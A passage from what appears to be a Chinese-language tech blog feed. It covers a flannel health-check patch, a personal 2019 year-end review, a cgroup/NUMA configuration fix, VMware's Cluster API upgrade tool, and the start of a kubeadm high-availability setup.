上查找相关的 Issue，果然发现了很多人遇到这个问题，倒是最终都没有提出比较好的方案来解决，其中 Eduard Català 分别提交了 2 个 PR 用来增加 Health Check 机制，但是不知道因为什么最终都没有合并：</p><ul><li><a href="https://github.com/coreos/flannel/pull/917" target="_blank" rel="noopener">https://github.com/coreos/flannel/pull/917</a></li><li><a href="https://github.com/coreos/flannel/pull/920" target="_blank" rel="noopener">https://github.com/coreos/flannel/pull/920</a></li></ul><p>我们来看看他的对应实现，通过检测对应的设备是否存在，如果不存在则不健康：</p><p>backend/vxlan/vxlan.go<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(be *VXLANBackend)</span> <span class="title">CheckHealthz</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">_, err := net.InterfaceByName(be.extIface.Iface.Name)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Master interface %v disappeared. Waiting its return..."</span>, be.extIface.Iface.Name)</span><br><span class="line"><span class="keyword">for</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(<span class="number">15</span> * time.Second)</span><br><span class="line">_, err = net.InterfaceByName(be.extIface.Iface.Name)</span><br><span class="line">&#125;</span><br><span class="line">log.Errorf(<span class="string">"Master interface: %v reappeared"</span>, be.extIface.Iface.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, err = net.InterfaceByName(be.network.dev.link.Name)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Flannel interface: %v not found - Requiring flannel restart "</span>, be.network.dev.link.Name)</span><br><span class="line"><span class="keyword">return</span> backend.FlannelRestart</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Flannel 社区活跃度不高，合并 PR 的速度更是慢的离谱，有很多存在很久的 Issue 也没有解决，感觉还是用着玩玩就好。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/containernetworking/plugins.git" target="_blank" rel="noopener">https://github.com/containernetworking/plugins.git</a></li><li><a href="https://github.com/Kevin-fqh/learning-k8s-source-code/blob/master/cni%20plugin/flannel%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB.md" target="_blank" rel="noopener">https://github.com/Kevin-fqh/learning-k8s-source-code/blob/master/cni%20plugin/flannel%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB.md</a></li><li><a href="https://cizixs.com/2016/07/16/flannel-source-code-insight/" target="_blank" rel="noopener">https://cizixs.com/2016/07/16/flannel-source-code-insight/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在用 K8s 的同学应该多少都使用过 Flannel 作为自己的网络插件，不讨论性能稳定性，在复杂的网络环境配置中 Flannel 的要求应
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>2019 年终总结</title>
    <link href="https://zdyxry.github.io/2019/12/31/2019-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>https://zdyxry.github.io/2019/12/31/2019-年终总结/</id>
    <published>2019-12-31T01:21:48.000Z</published>
    <updated>2019-12-29T01:56:26.884Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h2><p>2019 年就要结束了，今年用数据记录了很多，可以很好的支撑我做一个年终总结碎碎念。</p><h2 id="读书观影"><a href="#读书观影" class="headerlink" title="读书观影"></a>读书观影</h2><p>一整年都是两点一线：家里和公司，没有什么特别大的变化，周末的时间也都给了书和电影。</p><p>读书记录之前已经发过了，上半年看的比较多，下半年忙起来时间上少了很多，加上看的书的质量也比上半年高，所以看的比较细，用了很多时间去查相关资料。因为年后有些计划，所以集中把自己刚刚工作的时候买的纸质书（一直没看）清理了一下，愈发觉得刚工作的自己真是个愣头青，买的书都是水书，还是应该多看些经典书籍，需要更多思考的书。</p><p>电影看的多，至少豆瓣上标记的数量很吓人，周末基本上都会看几部。今年看的种类都比较阴暗，自己本意是放松一下的，看着看着心情更加沉重了。电影是另外一种了解世界的方式，我们可以看到不同的人，不同的风景，同时也会代入思考如果是自己会怎么做。在现实世界很多观点无法表述的现在，还是很有趣的。</p><p>书籍推荐：</p><ul><li>《操作系统导论》</li><li>《图解密码技术（第3版）》</li><li>《编码的奥秘》</li></ul><p>电影推荐：</p><ul><li>《平衡》</li><li>《电话亭》</li><li>《婚姻故事》</li></ul><img src="/2019/12/31/2019-年终总结/douban.png" title="Douban"><h2 id="习惯"><a href="#习惯" class="headerlink" title="习惯"></a>习惯</h2><p>2019 年算是养成了 2 个好习惯：刷题和写博客。</p><p>因为自己一直习惯早起（6点钟左右），以前都是当天要做什么工作，早上起来做一些准备之类的事情，有两点不好：一是把自己的时间都给了工作，导致自己会有种抵触；二是不规律，我喜欢规律。</p><p>所以从 4 月份开始，每天早上会做一道 LeetCode 题，目前一直坚持到现在。要说刷题有带给我什么质的变化么，那显然是没有的，但是我上面提到的两点不好，在刷题这里都消失了。刷题让我去认真的学习数据结构和算法，去了解一道题的不同种解法（往往会冒出“这tm的真是个人才”的感叹），而且会让我的生活更加规律，能从工作中抽出来，强烈推荐大家去试试。像我从 Easy 开始分类的做，最开始不会花费太长时间，做不出来就看看其他人怎么做，后续就会有些自己的想法。但是最近我做 Medium 的题耗时就比之前长好多了，有些题及时看着答案也要想很久，导致我又起的更早了。。</p><img src="/2019/12/31/2019-年终总结/github.png" title="GitHub"><p>2019 年自己定了每周更新一篇博客的目标，目标完成。一开始写博客是为了记录下自己的踩坑经历和一些经验分享，随后是自己发现一些新东西的时候自己学习了解的过程。要锻炼自己对外输出的能力，保证自己能够有逻辑的输出自己的观点，哪怕不能有逻辑的说出来，至少要有逻辑的写出来。</p><img src="/2019/12/31/2019-年终总结/blog.png" title="GoogleAnalytics"><h2 id="开销"><a href="#开销" class="headerlink" title="开销"></a>开销</h2><p>没有买什么新玩具，也没有什么特别大的开支，当然也没有存到什么钱。</p><h3 id="真实物品"><a href="#真实物品" class="headerlink" title="真实物品"></a>真实物品</h3><p>主要的开销在吃饭和房租，年初买了一个 iPad 用来看 PDF，毕竟无论是 Kindle 还是手机都不能很好的阅读，iPad 看 PDF 的效果是很好的，我也用它来看了一些书，但是有个问题是完整在 iPad 看完的书不到 10本，也是一个 <code>买前生产力，买后bilibili</code> 的例子了。</p><h3 id="虚拟物品"><a href="#虚拟物品" class="headerlink" title="虚拟物品"></a>虚拟物品</h3><p>自己平时需要跑一些 crontab 做事情，所以有一个祖传搬瓦工一直在供着，但是今年上网格外的困难，搬瓦工 IP 被封，所以又在 Azure 上搞了一个 VPS，目前看上去这套东西运转的还算顺利。</p><p>趁着年底活动，买了 RescueTime 的会员，估计明年会买 Pocket，毕竟重度用户。</p><p>P.S. 从带给自己生活感受的提升上，VPS 性价比可太高了。</p><h2 id="时间管理"><a href="#时间管理" class="headerlink" title="时间管理"></a>时间管理</h2><p>平时总是感觉自己时间不够用，就用了 RescueTime 记录自己的时间开销，12月份是一个比较完整的记录：家里的电脑，公司的电脑以及自己的手机。</p><img src="/2019/12/31/2019-年终总结/time.png" title="RescueTime"><p>真实情况是自己一个月在公司的时间 218 小时，真正写代码的时间 96 小时，平均下来一天有 5小时的高产出时间，跟自己预想的偏差很小，没什么意外。</p><img src="/2019/12/31/2019-年终总结/alltime.png" title="RescueTime"><p>抛开工作时间不提，手机占用了比较多的时间，而具体占用时间的大头部分在微信、Twitter 和浏览器。这部分是有很大程度优化的空间的。除了必要的社交，平时用浏览器阅读的习惯大概是这样：看到不错的文章如果不长，就在手机上看完，如果稍长或者没时间，就会收藏到 Pocket 中，等到每周五晚上再集中处理。这样会面临一个问题是我的 Pocket 有时候变成了一个收藏夹，什么东西都往里面放，而且我的很多时间也都通过 Pocket 来绑定，那些博客有读的必要么，有收藏的必要么，要仔细想想了。</p><h2 id="2020"><a href="#2020" class="headerlink" title="2020"></a>2020</h2><p>都用数据记录下来的好处就是可以量化的改进：</p><ol><li>保持看书状态，把部分观影时间也用来看书，并形成读书笔记</li><li>刷题不能停，把解题思路完整的记录下来，或文字，或图片</li><li>宁可不写也不要水博客，多记录些自己平时忽略的地方</li><li>合理利用软件，不依赖软件，尝试 GTD</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2019&quot;&gt;&lt;a href=&quot;#2019&quot; class=&quot;headerlink&quot; title=&quot;2019&quot;&gt;&lt;/a&gt;2019&lt;/h2&gt;&lt;p&gt;2019 年就要结束了，今年用数据记录了很多，可以很好的支撑我做一个年终总结碎碎念。&lt;/p&gt;
&lt;h2 id=&quot;读书观影&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>记一次 libcgroup 配置失败（二）</title>
    <link href="https://zdyxry.github.io/2019/12/25/%E8%AE%B0%E4%B8%80%E6%AC%A1-libcgroup-%E9%85%8D%E7%BD%AE%E5%A4%B1%E8%B4%A5%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://zdyxry.github.io/2019/12/25/记一次-libcgroup-配置失败（二）/</id>
    <published>2019-12-25T13:49:06.000Z</published>
    <updated>2019-12-25T14:10:42.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前几天同事找到我，说有一台服务器上的 cgroup 没有创建出来，导致其他程序出现了问题，记录一下。</p><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>在我们的服务器上，通常会通过 libcgconfig 来进行 cgroup 的配置，供其他服务使用。结果发现对应的 cgroup 没有创建出来，于是查看 cgconfig.service 的状态，发现是异常退出的：</p><img src="/2019/12/25/记一次-libcgroup-配置失败（二）/1.png" title="img1"><p>报错信息比较重要的是这一条：</p><p><code>failed to set /sys/fs/cgroup/cpuset/zbs/cpuset.mems: Invalid argument</code>。</p><h2 id="调查"><a href="#调查" class="headerlink" title="调查"></a>调查</h2><p>检查下 /etc/cgconfig.conf 中的配置是否正确：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">group . &#123;</span><br><span class="line">    cpuset &#123;</span><br><span class="line">        cpuset.memory_pressure_enabled = "1";</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">group zbs &#123;</span><br><span class="line">    cpu &#123;</span><br><span class="line">        cpu.rt_runtime_us = "950000";</span><br><span class="line">        cpu.rt_period_us = "1000000";</span><br><span class="line">    &#125;</span><br><span class="line">    cpuset &#123;</span><br><span class="line">        cpuset.cpus = "0,1,2,3,4,5";</span><br><span class="line">        cpuset.mems = "0-1";</span><br><span class="line">        cpuset.cpu_exclusive = "1";</span><br><span class="line">        cpuset.mem_hardwall = "1";</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>配置看上去没啥问题，这里的 <code>cpuset.mems</code> 指定的是 NUMA Node ID。</p><p>那么我们就来看看 NUMA 状态，使用 <code>numactl</code> 查看节点 NUMA 信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@node 21:53:25 ~]$numactl -H</span><br><span class="line">available: 2 nodes (0-1)</span><br><span class="line">node 0 cpus: 0 1 2 3 4 5 6 7 16 17 18 19 20 21 22 23</span><br><span class="line">node 0 size: 0 MB</span><br><span class="line">node 0 free: 0 MB</span><br><span class="line">node 1 cpus: 8 9 10 11 12 13 14 15 24 25 26 27 28 29 30 31</span><br><span class="line">node 1 size: 32654 MB</span><br><span class="line">node 1 free: 10234 MB</span><br><span class="line">node distances:</span><br><span class="line">node   0   1</span><br><span class="line">  0:  10  20</span><br><span class="line">  1:  20  10</span><br></pre></td></tr></table></figure><p>发现问题了，这个节点上有2个 CPU，但是其中的一个 CPU 上对应的节点内存出现了故障，导致 node0 对应的内存是 0MB。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>所以我们正确的姿势是将 <code>cpuset.mems</code> 从 <code>0-1</code> 改为 <code>1</code> ，然后重启 cgconfig。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@node 22:09:43 ~]$systemctl status cgconfig</span><br><span class="line">● cgconfig.service - Control Group configuration service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/cgconfig.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (exited) since Fri 2019-12-20 16:41:24 CST; 5 days ago</span><br><span class="line"> Main PID: 913 (code=exited, status=0/SUCCESS)</span><br><span class="line">    Tasks: 0</span><br><span class="line">   Memory: 0B</span><br><span class="line">   CGroup: /system.slice/cgconfig.service</span><br><span class="line"></span><br><span class="line">Dec 20 16:41:24 node systemd[1]: Starting Control Group configuration service...</span><br><span class="line">Dec 20 16:41:24 node systemd[1]: Started Control Group configuration service.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;前几天同事找到我，说有一台服务器上的 cgroup 没有创建出来，导致其他程序出现了问题，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;现象&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-Cluster API 升级流程</title>
    <link href="https://zdyxry.github.io/2019/12/22/Kubernetes-%E5%AE%9E%E6%88%98-Cluster-API-%E5%8D%87%E7%BA%A7%E6%B5%81%E7%A8%8B/"/>
    <id>https://zdyxry.github.io/2019/12/22/Kubernetes-实战-Cluster-API-升级流程/</id>
    <published>2019-12-22T08:53:55.000Z</published>
    <updated>2019-12-22T08:54:32.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前已经介绍过 ClusterAPI 及相应实现方式，但是针对使用 ClusterAPI 部署的 K8s 集群社区中一直没有升级方案，其中 vmware 实现了一个简单的<a href="https://github.com/vmware/cluster-api-upgrade-tool" target="_blank" rel="noopener">升级工具</a>，可以在社区没实现之前提供使用，今天来看下这个工具是如何实现的。</p><h2 id="cluster-api-upgrade-tool"><a href="#cluster-api-upgrade-tool" class="headerlink" title="cluster-api-upgrade-tool"></a>cluster-api-upgrade-tool</h2><p>项目地址：<a href="https://github.com/vmware/cluster-api-upgrade-tool" target="_blank" rel="noopener">https://github.com/vmware/cluster-api-upgrade-tool</a></p><p>因为这只是一个单独的工具，因此代码结构比较简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">yiran@t480:~/go/src/github.com/vmware/cluster-api-upgrade-tool </span><br><span class="line">master ✔ $ tree .</span><br><span class="line">.</span><br><span class="line">├── CODE-OF-CONDUCT.md</span><br><span class="line">├── CONTRIBUTING.md</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum</span><br><span class="line">├── hack</span><br><span class="line">│   └── tools</span><br><span class="line">│       ├── go.mod</span><br><span class="line">│       ├── go.sum</span><br><span class="line">│       └── main.go</span><br><span class="line">├── LICENSE.txt</span><br><span class="line">├── main.go # 命令行入口</span><br><span class="line">├── Makefile</span><br><span class="line">├── NOTICE.txt</span><br><span class="line">├── pkg</span><br><span class="line">│   ├── internal</span><br><span class="line">│   │   └── kubernetes</span><br><span class="line">│   │       ├── client.go # 获取 client</span><br><span class="line">│   │       └── pod_exec.go</span><br><span class="line">│   ├── logging</span><br><span class="line">│   │   └── logrus_logr.go</span><br><span class="line">│   └── upgrade</span><br><span class="line">│       ├── config.go </span><br><span class="line">│       ├── control_plane.go # 主要升级逻辑</span><br><span class="line">│       └── control_plane_test.go</span><br><span class="line">├── README.md</span><br><span class="line">└── test</span><br><span class="line">    └── integration</span><br><span class="line">        ├── go.mod</span><br><span class="line">        ├── go.sum</span><br><span class="line">        └── main_test.go</span><br></pre></td></tr></table></figure><h2 id="升级流程"><a href="#升级流程" class="headerlink" title="升级流程"></a>升级流程</h2><p>首先在 main.go 封装了相应的命令行用于升级，获取到相应配置后，开始升级：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upgrader, err := upgrade.NewControlPlaneUpgrader(newLogger(), finalConfig)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> upgrader.Upgrade()</span><br></pre></td></tr></table></figure><p>在 control_plane.go 文件中是升级的主要逻辑，所有的步骤都是顺序执行的，摘要下主要的步骤：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Upgrade does the upgrading of the control plane.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *ControlPlaneUpgrader)</span> <span class="title">Upgrade</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">machines, err := u.listMachines()</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> err := u.reconcileKubeadmConfigMapAPIEndpoints(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">err = u.updateKubeletConfigMapIfNeeded(u.desiredVersion)</span><br><span class="line">err = u.updateKubeletRbacIfNeeded(u.desiredVersion)</span><br><span class="line">    <span class="keyword">if</span> err := u.etcdClusterHealthCheck(<span class="number">15</span> * time.Second); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := u.UpdateProviderIDsToNodes(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> updateKubeadmKubernetesVersion(in, <span class="string">"v"</span>+u.desiredVersion.String())</span><br><span class="line"><span class="keyword">if</span> err := u.updateMachines(machines); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := u.reconcileKubeadmConfigMapAPIEndpoints(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>u.listMachines</code>获取 TargetCluster 所有的 ControlPlane 节点<br> a. 通过 label 来进行 machine 过滤<br> b. 如果 Machine 的 DeletionTimestamp 字段为 0，则追加到列表中</li><li><code>u.reconcileKubeadmConfigMapAPIEndpoints</code> 这里主要是确保对应的 APIEndpoints 节点都在 k8s 集群中，通过对比 nodeList 与 APIEndpoints 来进行过滤</li><li><code>u.updateKubeletConfigMapIfNeeded</code> 在 k8s 中，在 ConfigMap 中是有保存 kubelet 配置信息的，在升级过程中，需要重新创建对应版本的 kubelet 配置信息，这个函数中直接将原版本的 kubelet 复制了一份，创建一份目标版本的 kublet 配置 ConfigMap</li><li><code>u.updateKubeletRbacIfNeeded</code> 创建目标版本的 Role 和 RoleBinding 资源</li><li><code>u.etcdClusterHealthCheck</code> 检查 etcd 集群是否健康，这里主要通过 <code>endpoint health --endpoints</code> 来检查 etcd 是否健康</li><li><code>u.UpdateProviderIDsToNodes</code> 通过 Cluster-API 创建出来的节点，需要设置 node.ProviderID 才可以被 Cluster-API 识别为 running 状态，ProviderId 格式为：<code>vmware://xxxxx</code> ，这里根据 ProviderID 来检测出具体的 ID，并将其作为一个 map 返回</li><li><code>u.updateKubeadmKubernetesVersion</code> 将 kubeadm ConfigMap 中的  <code>kubernetesVersion</code> 字段更新为目标版本，便于后续添加节点时指定的是目标版本</li><li><code>u.updateMachines</code> 在所有配置文件已经准备、更新完成后，开始做整个升级中最重要的部分，节点（Machine）升级，首先遍历所有 Machine 资源，针对每个 Machine，进行如下动作：<br> a. <code>u.etcdClusterHealthCheck</code> 检查 etcd 集群是否健康，如果不健康，则退出升级<br> b. <code>generateReplacementMachineName</code> 生成替代 Machine 相应配置信息，如 MachineName<br> c. <code>u.updateInfrastructureReference</code> 创建替代 Machine 的 Infrastructure Object<br> d. <code>u.updateBootstrapConfig</code> 创建替代 Machine 的 Bootstrap Config，因为默认 Cluster-API 使用的 kubeadm Bootstrap，所以这里其实是生成替代 Machine 执行的 kubeadm 配置<br> e. <code>u.updateMachine</code> 真正创建替代 Machine 的步骤，创建对应的目标虚拟机，等待目标虚拟机添加到 K8s 集群中且处于 Ready 后，将原虚拟机对应 etcd 节点从 etcd 集群中移除，随后将原虚拟机对应节点从 K8s 集群中移除  </li><li><code>u.reconcileKubeadmConfigMapAPIEndpoints</code> 等待所有 Machine 替换完成后，重新配置 kubeadm ConfigMap 保证 kubeadm ConfigMap 中保存所有的 APIEndpoints 信息。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Cluster-API 作为 K8s cluster-lifecycle SIG 的一个还处于 Alpha 阶段的项目，还处于一个快速更新迭代的状态，因此最终升级流程是怎样还不确定，但是从 vmware 的这个工具来看，后续很有可能采用这种方案，毕竟 Cluster-API 不想通过 SSH 这种比较麻（恶）烦（心）的方式对节点进行管理，从 kubeadm Bootstrap 使用 Cloud-init 就可以看出，尤其是当支持多种 Linux 发行版后，可以预想这是一个灾难。因此使用这种节点逐一替换的方式是很方便的，具体实现看 v1alpha3 发布之后社区的讨论结果吧。</p><p>吐槽：<br>Cluster-API 项目在代码中很少使用缩写，带来的好处很明显，易读易懂，上手容易，我自己的项目也一直秉承着这种观点，但是当我看到 <code>reconcileKubeadmConfigMapAPIEndpoints</code> 这种长度的变量名，还是很崩溃的。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/vmware/cluster-api-upgrade-tool" target="_blank" rel="noopener">https://github.com/vmware/cluster-api-upgrade-tool</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;之前已经介绍过 ClusterAPI 及相应实现方式，但是针对使用 ClusterAPI 部署的 K8s 集群社区中一直没有升级方案，其中 
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-高可用集群部署（无LB）</title>
    <link href="https://zdyxry.github.io/2019/12/19/Kubernetes-%E5%AE%9E%E6%88%98-%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%EF%BC%88%E6%97%A0LB%EF%BC%89/"/>
    <id>https://zdyxry.github.io/2019/12/19/Kubernetes-实战-高可用集群部署（无LB）/</id>
    <published>2019-12-19T13:38:16.000Z</published>
    <updated>2019-12-19T13:38:41.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前写过一篇<a href="https://zdyxry.github.io/2019/06/15/Kubernetes-%E5%AE%9E%E6%88%98-%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/">《Kubernetes 实战-高可用集群部署》</a> 博客讲 K8S 高可用配置，当时采用的方式是使用 keepalived 配合 HAProxy 自建 LB 的方式，但是最近发现无论是 Kubespray 还是 Rancher RKE 都没有采用这种方式，而是在 worker node 上配置 nginx/haproxy 代理 APIServer 达到目的。今天来手动配置下这种方式，了解下注意事项。</p><p>本文配置方式参考 Kubespray，主要是想加深自己对这方面的理解，如果只是单纯的想要搭建环境，那么直接使用 Kubespray 就好。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table><thead><tr><th>IP</th><th>role</th></tr></thead><tbody><tr><td>192.168.17.11</td><td>ControlPlane1</td></tr><tr><td>192.168.17.12</td><td>ControlPlane2</td></tr><tr><td>192.168.17.13</td><td>ControlPlane3</td></tr><tr><td>192.168.17.14</td><td>WorkerNode1</td></tr></tbody></table><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p>这部分准备工作与之前一样，没什么不同，因此不详细说明，需要安装 kubectl,kubeadm,kubelet 。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="ControlPlane1"><a href="#ControlPlane1" class="headerlink" title="ControlPlane1"></a>ControlPlane1</h3><p>kubeadm 配置文件如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@install1 17:55:09 tmp]$cat kubeadm.yaml</span><br><span class="line">---</span><br><span class="line">apiServer: &#123;&#125;</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta1</span><br><span class="line">certificatesDir: ""</span><br><span class="line">clusterName: test</span><br><span class="line">controlPlaneEndpoint: "192.168.17.11:6443"</span><br><span class="line">controllerManager: &#123;&#125;</span><br><span class="line">dns:</span><br><span class="line">  type: ""</span><br><span class="line">etcd: &#123;&#125;</span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line">kind: ClusterConfiguration</span><br><span class="line">kubernetesVersion: ""</span><br><span class="line">networking:</span><br><span class="line">  dnsDomain: ""</span><br><span class="line">  podSubnet: 10.244.0.0/16</span><br><span class="line">  serviceSubnet: ""</span><br><span class="line">scheduler: &#123;&#125;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">apiVersion: kubeadm.k8s.io/v1beta1</span><br><span class="line">kind: InitConfiguration</span><br><span class="line">localAPIEndpoint:</span><br><span class="line">  advertiseAddress: "192.168.17.11"</span><br><span class="line">  bindPort: 6443</span><br><span class="line">nodeRegistration:</span><br><span class="line">  name: 'install1'</span><br></pre></td></tr></table></figure><p>执行部署动作：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 